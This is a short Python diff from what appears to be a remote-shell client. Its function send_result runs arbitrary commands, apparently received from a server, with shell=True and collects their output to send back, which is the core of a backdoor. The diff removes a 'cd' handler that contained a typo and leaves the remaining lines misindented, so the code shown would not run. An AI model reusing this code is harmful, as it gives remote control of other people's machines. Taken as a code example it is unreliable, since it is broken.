@@ -34,11 +34,6 @@ def send_result(command):
     """ Envia datos al servidor de forma segura """
     resultado = ''
     try:
-        if command.startwith('cd '):
-            ruta = command.strip('cd ')
-            os.chdir(ruta)
-            resultado = f'[+] Directorio actual: {os.getcwd()}'
-        else:
             resultado = subprocess.run(command, shell=True, capture_output=True, text=True)
             resultado = {'stdout': resultado.stdout, 'stderr': resultado.stderr}
     except Exception as e:
